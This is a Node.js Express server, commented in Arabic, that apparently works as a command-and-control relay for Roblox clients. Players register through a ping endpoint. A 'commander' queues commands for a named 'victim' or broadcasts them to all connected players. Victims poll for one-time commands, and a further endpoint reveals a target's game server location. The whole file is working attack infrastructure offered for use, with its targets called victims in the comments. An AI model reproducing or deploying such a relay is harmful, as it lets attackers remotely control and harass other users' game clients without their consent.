const express = require('express');
const app = express();
app.use(express.json());
app.use(require('cors')());

// -------------------- تخزين البيانات في الذاكرة --------------------
let players = {};          // { username: { placeId, jobId, lastSeen } }
let commands = {};         // { targetUsername: { commander, message, time } }

// تنظيف اللاعبين غير النشطين كل 30 ثانية
setInterval(() => {
    const now = Date.now();
    for (let name in players) {
        if (now - players[name].lastSeen > 30000) {
            delete players[name];
        }
    }
}, 30000);

// -------------------- نقطة النهاية /ping --------------------
// يسجل اللاعب أو يحدّث وجوده
app.post('/ping', (req, res) => {
    const { username, placeId, jobId } = req.body;
    if (!username) return res.status(400).json({ error: 'missing username' });
    players[username] = {
        placeId: placeId || 'unknown',
        jobId: jobId || 'unknown',
        lastSeen: Date.now()
    };
    res.json({ status: 'ok' });
});

// -------------------- نقطة النهاية /players --------------------
// ترجع قائمة بأسماء جميع اللاعبين النشطين
app.get('/players', (req, res) => {
    const active = Object.keys(players);
    res.json(active);
});

// -------------------- نقطة النهاية /update --------------------
// القائد يرسل أمراً إلى ضحية معينة
app.post('/update', (req, res) => {
    const { username, message, time } = req.body;
    if (!username || !message) return res.status(400).json({ error: 'missing data' });

    const parts = message.split(' ');
    const cmd = parts[0];
    let target = parts[1];
    if (!target) return res.status(400).json({ error: 'no target specified' });

    // إذا كان الهدف 'all' – نضيف الأمر لكل لاعب متصل
    if (target === 'all') {
        for (let victim in players) {
            commands[victim] = {
                commander: username,
                message: cmd,           // نرسل الأمر فقط بدون كلمة all
                time: time || Date.now()
            };
        }
        return res.json({ status: 'broadcasted' });
    }

    // أمر عادي – يوجه للاعب واحد
    commands[target] = {
        commander: username,
        message: cmd,
        time: time || Date.now()
    };
    res.json({ status: 'ok', target });
});

// -------------------- نقطة النهاية /data --------------------
// الضحية تجلب الأمر المخصص لها (يُحذف بعد الجلب)
app.get('/data', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).json({ error: 'missing username' });

    const cmd = commands[username];
    if (cmd) {
        delete commands[username]; // استهلاك الأمر (مرة واحدة)
        res.json(cmd);
    } else {
        res.json(null);
    }
});

// -------------------- (اختياري) /target_info --------------------
// للحصول على مكان و jobId للاعب معين – يحتفظ به للتوافق
app.get('/target_info', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).json({ error: 'missing username' });
    const p = players[username];
    if (p) {
        res.json({ placeId: p.placeId, jobId: p.jobId });
    } else {
        res.json(null);
    }
});

// -------------------- تشغيل السيرفر --------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
